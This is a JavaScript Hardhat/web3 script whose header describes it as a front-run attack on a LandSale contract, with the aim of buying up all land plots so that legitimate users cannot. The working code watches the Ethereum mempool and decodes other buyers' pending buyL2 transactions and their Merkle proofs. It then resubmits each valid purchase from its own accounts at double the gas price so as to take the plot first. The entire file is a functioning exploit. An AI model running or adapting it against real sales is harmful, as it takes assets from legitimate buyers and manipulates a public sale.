/**
 * Front-run attack is an attempt to buy all the plots,
 * preventing legitimate users from buying the plots
 */

// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const {web3, Web3, config, network} = hre;
const {toHex} = web3.utils;

// standard node.js modules in use
const path = require("path");

// using logger instead of console to allow output control
const log = require("loglevel");
log.setLevel(process.env.LOG_LEVEL? process.env.LOG_LEVEL: "info");

// BN utils
const {
	toBN,
	print_amt,
} = require("../include/bn_utils");

// number utils
const {
	unix_to_date,
	date_to_unix,
} = require("../../test/include/number_utils");

// sale data utils
const {
	load_sale_data_csv,
} = require("../include/sale_data_utils");

// land data utils
const {
	parse_plot_data,
	plot_to_metadata,
} = require("../../test/protocol/include/land_data_utils");

// Merkle tree utils
const {
	generate_tree,
} = require("../../test/protocol/include/merkle_tree_utils");

// common utils
const {
	print_acc_info,
} = require("./include/common");

// TODO: import from config
// deployed addresses and other configurable values
const land_sale_address = "0x03cC5a14E849d37714AE698E7A1727A0F9cc7C2a";
const use_sIlv = true; // should we buy with sILV (true) or ETH (false)
const plots_data_file_name = "land_sale_1_public.csv";

// we're going to use async/await programming style, therefore we put
// all the logic into async main and execute it in the end of the file
// see https://javascript.plainenglish.io/writing-asynchronous-programs-in-javascript-9a292570b2a6
async function main() {
	// Hardhat always runs the compile task when running scripts with its command
	// line interface.
	//
	// If this script is run directly using `node` you may want to call compile
	// manually to make sure everything is compiled
	// await hre.run('compile');

	// print some useful info on the available accounts
	const chainId = await web3.eth.getChainId();
	const accounts = await web3.eth.getAccounts();
	const [A0] = accounts;
	const nonce = await web3.eth.getTransactionCount(A0);
	const balance = toBN(await web3.eth.getBalance(A0));

	// print initial debug information
	log.info("network %o", chainId);
	log.info("service account %o, nonce: %o, balance: %o ETH", A0, nonce, print_amt(balance));

	// load ABIs in use
	const {abi: sILV_abi} = require(path.join(
		__dirname,
		"../../artifacts/contracts/interfaces/ERC20Spec.sol/ERC20.json"
	));
	const {abi: land_sale_abi} = require(path.join(
		__dirname,
		"../../artifacts/contracts/protocol/LandSale.sol/LandSale.json"
	));

	// deployed addresses
	const sILV_address = config.namedAccounts.sIlv_address[network.name];

	// connect to the contracts
	const land_sale = new web3.eth.Contract(land_sale_abi, land_sale_address);
	const sILV = new web3.eth.Contract(sILV_abi, sILV_address);

	// print all the accounts info
	const {nonces, balances, sILV_balances} = await print_acc_info(accounts, sILV);

	// detect service account sILV balance
	let sILV_balance = toBN(await sILV.methods.balanceOf(A0).call());
	console.log("service account sILV (%o) balance: %o sILV", sILV_address, print_amt(sILV_balance));

	// check the land sale has permission to take sILV and enable it if required
	await setup_allowances(accounts, sILV, land_sale_address);

	// load sale data
	const plots = load_sale_data_csv(path.join(__dirname, "../data/", plots_data_file_name));
	log.info("loaded %o land plots", plots.length);
	// generate Merkle tree
	// parse the input, generate Merkle tree
	const {tree, root, leaves} = generate_tree(plots);
	// enrich plots array with leaves information
	plots.forEach((p, i) => {
		p.leaf = leaves[i];
	});
	log.info("generated Merkle tree with %o leaves", leaves.length);

	// test the connection and print the land sale info
	const ls_params = await print_ls_info(land_sale);
	const {
		root: root_ext,
		isActive,
	} = ls_params;

	// verify we have good land plots data
	assert.equal(root, root_ext, `Merkle root mismatch: ${plots_data_file_name} vs LandSale.root`);

	// verify the sale is active
	assert(isActive, "inactive sale");

	// determine which plots are currently available on sale
	const plots_on_sale = await print_plots_on_sale(land_sale, filter_plots_on_sale(plots, ls_params));
	log.info("%o plots are available currently on sale", plots_on_sale.length);

		// execute the front-run attack
	// await buy_plots(sILV, land_sale, plots_on_sale, tree, accounts.slice(1), nonces.slice(1));
	await front_run_plots(sILV, land_sale, ls_params, plots, tree, accounts.slice(1));
}

async function setup_allowances(accounts, sILV, land_sale_address) {
	const start_time = performance.now();

	log.info("verifying the sILV %o allowances on LandSale@%o", sILV.options.address, land_sale_address);
	const allowances = await Promise.all(accounts.map(a => sILV.methods.allowance(a, land_sale_address).call()));

	const max_allowance = toBN("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");

	const txs = accounts.filter((a, i) => toBN(allowances[i]).lt(toBN(10).pow(toBN(30))))
		.map(from => sILV.methods.approve(land_sale_address, max_allowance).send({from}));

	log.info("setting up sILV allowances for %o accounts", txs.length);
	const receipts = await Promise.all(txs);

	const end_time = performance.now();
	log.info("allowances setup complete in in %oms", end_time - start_time);

	return receipts;
}

async function print_ls_info(land_sale) {
	const start_time = performance.now();

	// get land sale state data
	const [
		targetNftContract,
		sIlvContract,
		priceOracle,
		root,
		saleStart,
		saleEnd,
		halvingTime,
		timeFlowQuantum,
		seqDuration,
		seqOffset,
		pausedAt,
		pauseDuration,
		startPrices,
		beneficiary,
		isActive,
		ownTime,
		now32,
	] = await Promise.all([
		land_sale.methods.targetNftContract().call(),
		land_sale.methods.sIlvContract().call(),
		land_sale.methods.priceOracle().call(),
		land_sale.methods.root().call(),
		land_sale.methods.saleStart().call(),
		land_sale.methods.saleEnd().call(),
		land_sale.methods.halvingTime().call(),
		land_sale.methods.timeFlowQuantum().call(),
		land_sale.methods.seqDuration().call(),
		land_sale.methods.seqOffset().call(),
		land_sale.methods.pausedAt().call(),
		land_sale.methods.pauseDuration().call(),
		land_sale.methods.getStartPrices().call(),
		land_sale.methods.beneficiary().call(),
		land_sale.methods.isActive().call(),
		land_sale.methods.ownTime().call(),
		land_sale.methods.now32().call(),
	]);

	const ls_params = {
		targetNftContract,
		sIlvContract,
		priceOracle,
		root,
		saleStart,
		saleEnd,
		saleDuration: saleEnd - saleStart,
		halvingTime,
		timeFlowQuantum,
		seqDuration,
		seqOffset,
		pausedAt,
		pauseDuration,
		startPrices,
		beneficiary,
		isActive,
		ownTime,
		now32,
	};

	// derive the sequences on sale
	// derive the sequences which are currently available on sale
	const {seqFrom, seqTo} = get_current_seq_bounds(ls_params);

	console.table([
		{"key": "targetNftContract", "value": targetNftContract},
		{"key": "sIlvContract", "value": sIlvContract},
		{"key": "priceOracle", "value": priceOracle},
		{"key": "root", "value": root},
		{"key": "saleStart", "value": unix_to_date(saleStart)},
		{"key": "saleEnd", "value": unix_to_date(saleEnd)},
		{"key": "halvingTime", "value": halvingTime},
		{"key": "timeFlowQuantum", "value": timeFlowQuantum},
		{"key": "seqDuration", "value": seqDuration},
		{"key": "seqOffset", "value": seqOffset},
		{"key": "pausedAt", "value": unix_to_date(pausedAt)},
		{"key": "pauseDuration", "value": pauseDuration},
		{"key": "startPrices", "value": startPrices.map(p => print_amt(p))},
		{"key": "beneficiary", "value": beneficiary},
		{"key": "isActive", "value": isActive},
		{"key": "seqOnSale", "value": `[${seqFrom}, ${seqTo})`},
		{"key": "ownTime", "value": unix_to_date(ownTime)},
		{"key": "now32", "value": unix_to_date(now32)},
	]);

	const end_time = performance.now();
	log.info("successfully connected to LandSale@%o in %oms", land_sale.options.address, end_time - start_time);

	return ls_params;
}

function get_current_seq_bounds(ls_params) {
	const {
		saleStart,
		saleDuration,
		seqDuration,
		seqOffset,
		pauseDuration,
	} = ls_params;
	const now = date_to_unix(new Date());
	const ownTime = now - pauseDuration;

	const fullSequences = Math.max(0, Math.floor((saleDuration - seqDuration) / seqOffset) + 1);
	const seqFrom = Math.min(
		fullSequences,
		Math.max(
			0,
			Math.floor((ownTime - saleStart - seqDuration) / seqOffset) + 1
		)
	);
	const seqTo = Math.max(
		0,
		Math.min(
			fullSequences,
			Math.floor((ownTime - saleStart) / seqOffset) + 1
		)
	);

	return {seqFrom, seqTo};
}

function filter_plots_on_sale(plots, ls_params) {
	// derive the sequences on sale
	// derive the sequences which are currently available on sale
	const {seqFrom, seqTo} = get_current_seq_bounds(ls_params);

	return plots.filter(p => p.sequenceId >= seqFrom && p.sequenceId < seqTo);
}

async function print_plots_on_sale(land_sale, plots) {
	const start_time = performance.now();

	const txs = plots.map(p => land_sale.methods.exists(p.tokenId).call());
	const existing_plots = await Promise.all(txs);
	const plots_on_sale = [];
	plots.forEach((p, i) => {
		if(!existing_plots[i]) {
			plots_on_sale.push(p);
		}
	});

	const end_time = performance.now();
	log.info("%o live plots on sale detected in %oms", plots_on_sale.length, end_time - start_time);

	return plots_on_sale;
}

async function buy_plots(sILV, land_sale, plots, tree, accounts) {
	if(plots.length === 0) {
		log.info("no plots to buy, skipping");
		return [];
	}

	const start_time = performance.now();

	log.info("buying %o plots... please wait...", plots.length);
	const txs = plots.map((p, i) => {
		return land_sale.methods.buyL2(plot_to_metadata(parse_plot_data(p)), tree.getHexProof(p.leaf)).send({
			from: accounts[i],
			value: 80_000_000_000, // TODO: calculate the price
			gas: 300_000, // TODO: calculate more accurately
			// gasPrice: 2_000_000_000,
			// maxFeePerGas: 3_000_000_000,
			// maxPriorityFeePerGas: 2_000_000_000,
		});
	});
	const receipts = await Promise.allSettled(txs);

	// print the front-run attack execution result
	const table_data = receipts.map((r, i) => new Object({
		"tokenId": plots[i].tokenId,
		"sequenceId": plots[i].sequenceId,
		"tierId": plots[i].tierId,
		"status": r.status,
		"gasUsed": r.value? r.value.gasUsed: "N/A",
	}));
	console.table(table_data);

	const end_time = performance.now();
	log.info("bought %o plots in %oms", receipts.filter(r => r.status === "fulfilled").length, end_time - start_time);

	return receipts;
}

function front_run_plots(sILV, land_sale, ls_params, plots, tree, accounts) {
	// access the Ethereum mempool
	// https://www.quicknode.com/guides/defi/how-to-access-ethereum-mempool
	const providerUrl = network.config.url.replace("https://", "wss://");
	const options = {
		timeout: 30000,
		clientConfig: {
			maxReceivedFrameSize: 100000000,
			maxReceivedMessageSize: 100000000,
		},
		reconnect: {
			auto: true,
			delay: 5000,
			maxAttempts: 15,
			onTimeout: false,
		},
	};

	const web3 = new Web3(new Web3.providers.WebsocketProvider(providerUrl, options));
	return new Promise((resolve, reject) => {
		setTimeout(() => resolve(true), 1_800_000);
		const subscription = web3.eth.subscribe("pendingTransactions", (err, res) => {
			if(err) {
				console.error("error subscribing on pendingTransactions: %o", err);
			}
			else {
				log.debug("successfully subscribed on pendingTransactions: %o", res);
			}
		});

		subscription.on("connected", nr => log.info("subscription connected: %o", nr));
		subscription.on("changed", changed => log.info("subscription changed: %o", changed));
		subscription.on("error", err => {
			log.error("subscription error: %o", err);
			reject(err);
		});

		subscription.on("data", txHash => {
			log.debug("subscription data (tx) received: %o", txHash);
			setTimeout(async() => {
				try {
					const tx = await web3.eth.getTransaction(txHash);
					const from = tx.from;
					if(tx.to !== land_sale.options.address || accounts.includes(from)) {
						log.debug("not a LandSale tx, or own tx, ignoring");
						return;
					}

					log.info("got a LandSale tx: %o", txHash);
					log.debug("LandSale tx body: %o", tx);
					const type = parseInt(tx.type);
					const gasPrice = parseInt(tx.gasPrice);
					const maxFeePerGas = parseInt(tx.maxFeePerGas);
					const maxPriorityFeePerGas = parseInt(tx.maxPriorityFeePerGas);
					const input = tx.input;
					const value = toBN(tx.value);
					console.table([
						{"key": "from", "value": from},
						{"key": "type", "value": type},
						{"key": "gasPrice", "value": gasPrice},
						{"key": "maxFeePerGas", "value": maxFeePerGas},
						{"key": "maxPriorityFeePerGas", "value": maxPriorityFeePerGas},
						{"key": "input length", "value": input.length},
						{"key": "value", "value": print_amt(value)},
					]);

					try {
						const {tokenId, sequenceId, regionId, x, y, tierId, size, proof} = parse_ls_tx_input(input);
						log.info("got buyL2 tx: %o", txHash);
						console.table([
							{"key": "tokenId", "value": tokenId},
							{"key": "sequenceId", "value": sequenceId},
							{"key": "regionId", "value": regionId},
							{"key": "x", "value": x},
							{"key": "y", "value": y},
							{"key": "tierId", "value": tierId},
							{"key": "size", "value": size},
							{"key": "proof size", "value": proof.length},
						]);

						// validate the tx
						const p = filter_plots_on_sale(plots, ls_params).find(p => p.tokenId === tokenId);
						if(!p) {
							log.info("an attempt to buy unknown plot %o", tokenId);
							return;
						}

						if(p.sequenceId !== sequenceId
							|| p.regionId !== regionId
							|| p.x !== x
							|| p.y !== y
							|| p.size !== size) {
							log.info("an attempt to buy a plot %o with wrong metadata", tokenId);
							console.table([
								{"key": "tokenId", "value": p.tokenId},
								{"key": "sequenceId", "value": p.sequenceId},
								{"key": "regionId", "value": p.regionId},
								{"key": "x", "value": p.x},
								{"key": "y", "value": p.y},
								{"key": "tierId", "value": p.tierId},
								{"key": "size", "value": p.size},
							]);
							return;
						}

						// verify the proof
						if(!compare_proofs(proof, tree.getHexProof(p.leaf))) {
							log.info("an attempt to buy a plot %o with wrong Merkle proof", tokenId);
							log.info("expected proof: %o", tree.getHexProof(p.leaf));
							log.info("actual proof: %o", proof);
							return;
						}

						const fr_acc = accounts[tokenId % accounts.length]; // TODO: track accounts
						log.info("an attempt to buy a valid plot %o: front-running! (account: %o)", tokenId, fr_acc);
						// get network current gas price
						const network_gas_price = parseInt(await web3.eth.getGasPrice());

						if(gasPrice * 2 < network_gas_price) {
							log.info("tx gas price is too low (%o), ignoring (no need to front-run)", gasPrice);
							return;
						}

						// front-run the tx
						const receipt = await land_sale.methods.buyL2(
							plot_to_metadata(parse_plot_data(p)),
							tree.getHexProof(p.leaf)
						).send({
							from: fr_acc,
							value: use_sIlv? 0: ls_params.startPrices[p.tierId], // TODO: calculate the price
							gas: 300_000, // TODO: calculate more accurately
							gasPrice: gasPrice * 2,
							maxFeePerGas: maxFeePerGas * 2,
							maxPriorityFeePerGas: maxPriorityFeePerGas * 2,
							// nonce: nonces[i]++,
						}).on("transactionHash", function(transactionHash) {
							log.info("front-run tx submitted: %o", transactionHash);
						});
						log.info("front-run tx executed: %o", receipt.transactionHash);
						log.debug("front-run receipt: %o", receipt);
					}
					catch(e) {
						log.debug("not a buyL2 tx or tx data malformed: %o", e);
					}
				}
				catch(e) {
					log.error("error receiving tx object: %o", e);
				}
			});
		});
	});
}

function parse_ls_tx_input(input) {
	/*
	 * example input: 0x4d0b189f00000000000000000000000000000000000000000000000000000000000005e40000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000d2000000000000000000000000000000000000000000000000000000000000007d000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000f1e56e9c972a948eb0a04da30996960e1097cd3c16744355dd75f4a5408b355b1d32765d5806b6574e3625e9e5a61f1780e53f15677fd8d58a368f428da80ecf86af4355cee15a5467e079cc8ab4dfc18e9dc6ed6fe563fae5f9a9439d7c14f1d529a37859e2f5616ce5c0a145753b96adfa4b3edf91118f62b3df62c76038a3561c85a40c01f5d4fbb41c61ab19d1c32862a747b7092ad7376265de79b06aec39349a20ee48c840ea9ded84b9fd14d7dc870c8b80dd074fd2db401da80db0251645b6b2a29240e603eab8a9843025323a473f43c6f6f282d5ce702a0a9967ca7005b1a005e444d76a62c07cccd2f2feb1a06160a184df5c61994c6e4f4e2b47ac562bd00b990bdd118cae786f825c2069506fa4c5eb33db97262e2e75e5b2c8a916ad85320057c95d0875121c51d47f36c5dba53fe57bbf89990e8109e09a32f2e1d9fa8b588a7b68defd1998314648c54b8f4f1859c9787544ecd89d15a5c1fe18bfc870e35c04c8e11e1c8aff83d7947d37b3986721112ab92182c4ec6c0637da4944c48127715161482c3a8e61d2d28ea403f291a299b0c8fe5bffbbb19f39c1bec51393b8fb5093e2458f25a8f5636b5215af2869f11d36fce605873dceec9e472632186979d0ca6de353686db6f26858f0c01aa4d82d711cfea2699ed31
	 *
	 * selector: 4d0b189f (buyL2)
	 * PlotData:
	 *   tokenId:     00000000000000000000000000000000000000000000000000000000000005e4
	 *   sequenceId:  0000000000000000000000000000000000000000000000000000000000000005
	 *   regionId:    0000000000000000000000000000000000000000000000000000000000000001
	 *   x:           00000000000000000000000000000000000000000000000000000000000000d2
	 *   y:           000000000000000000000000000000000000000000000000000000000000007d
	 *   tierId:      0000000000000000000000000000000000000000000000000000000000000001
	 *   size:        0000000000000000000000000000000000000000000000000000000000000032
	 * proof:
	 *   offset:      0000000000000000000000000000000000000000000000000000000000000100
	 *   length:      000000000000000000000000000000000000000000000000000000000000000f
	 *   proof_array: 1e56e9c972a948eb0a04da30996960e1097cd3c16744355dd75f4a5408b355b1
	 *                d32765d5806b6574e3625e9e5a61f1780e53f15677fd8d58a368f428da80ecf8
	 *                6af4355cee15a5467e079cc8ab4dfc18e9dc6ed6fe563fae5f9a9439d7c14f1d
	 *                529a37859e2f5616ce5c0a145753b96adfa4b3edf91118f62b3df62c76038a35
	 *                61c85a40c01f5d4fbb41c61ab19d1c32862a747b7092ad7376265de79b06aec3
	 *                9349a20ee48c840ea9ded84b9fd14d7dc870c8b80dd074fd2db401da80db0251
	 *                645b6b2a29240e603eab8a9843025323a473f43c6f6f282d5ce702a0a9967ca7
	 *                005b1a005e444d76a62c07cccd2f2feb1a06160a184df5c61994c6e4f4e2b47a
	 *                c562bd00b990bdd118cae786f825c2069506fa4c5eb33db97262e2e75e5b2c8a
	 *                916ad85320057c95d0875121c51d47f36c5dba53fe57bbf89990e8109e09a32f
	 *                2e1d9fa8b588a7b68defd1998314648c54b8f4f1859c9787544ecd89d15a5c1f
	 *                e18bfc870e35c04c8e11e1c8aff83d7947d37b3986721112ab92182c4ec6c063
	 *                7da4944c48127715161482c3a8e61d2d28ea403f291a299b0c8fe5bffbbb19f3
	 *                9c1bec51393b8fb5093e2458f25a8f5636b5215af2869f11d36fce605873dcee
	 *                c9e472632186979d0ca6de353686db6f26858f0c01aa4d82d711cfea2699ed31
	 */

	assert.isAtLeast(input.length, 650, "input data too short");

	const selector = input.slice(0, 10);
	assert.equal(selector, "0x4d0b189f", "unexpected selector");

	const data = input.slice(10);
	assert(data.length % 64 === 0, "unexpected data length");

	const parts = [];
	for(let i = 0; i < data.length; i += 64) {
		parts.push(data.slice(i, i + 64));
	}

	const params = parts.map(p => toBN("0x" + p));
	const [tokenId, sequenceId, regionId, x, y, tierId, size] = params.slice(0, 7).map(n => parseInt(n));
	const proof = params.slice(9).map(n => toHex(n));

	return {tokenId, sequenceId, regionId, x, y, tierId, size, proof};
}

function compare_proofs(proof1, proof2) {
	if(!proof1 || !proof2) {
		return false;
	}
	if(proof1.length !== proof2.length) {
		return false;
	}
	for(let i = 0; i < proof1.length; i++) {
		if(!toBN(proof1[i]).eq(toBN(proof2[i]))) {
			return false;
		}
	}
	return true;
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
	.then(() => process.exit(0))
	.catch((error) => {
		console.error(error);
		process.exit(1);
	});
